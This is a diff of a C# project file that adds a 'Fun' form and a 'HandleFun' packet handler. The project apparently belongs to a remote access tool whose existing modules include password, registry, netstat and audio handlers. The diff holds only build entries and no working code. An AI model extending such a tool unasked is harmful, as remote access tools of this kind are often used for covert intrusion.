@@ -137,6 +137,12 @@
     <Compile Include="Algorithm\GetHash.cs" />
     <Compile Include="Algorithm\Sha256.cs" />
     <Compile Include="Algorithm\Zip.cs" />
+    <Compile Include="Forms\FormFun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FormFun.Designer.cs">
+      <DependentUpon>FormFun.cs</DependentUpon>
+    </Compile>
     <Compile Include="Forms\FormRegValueEditBinary.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -282,6 +288,7 @@
       <DependentUpon>FormRegistryEditor.cs</DependentUpon>
     </Compile>
     <Compile Include="Handle Packet\HandleAudio.cs" />
+    <Compile Include="Handle Packet\HandleFun.cs" />
     <Compile Include="Handle Packet\HandlePassword.cs" />
     <Compile Include="Handle Packet\HandleInformation.cs" />
     <Compile Include="Handle Packet\HandleNetstat.cs" />
@@ -365,6 +372,9 @@
     <Compile Include="StreamLibrary\src\LzwCompression.cs" />
     <Compile Include="StreamLibrary\src\NativeMethods.cs" />
     <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <EmbeddedResource Include="Forms\FormFun.resx">
+      <DependentUpon>FormFun.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\FormRegValueEditBinary.resx">
       <DependentUpon>FormRegValueEditBinary.cs</DependentUpon>
     </EmbeddedResource>
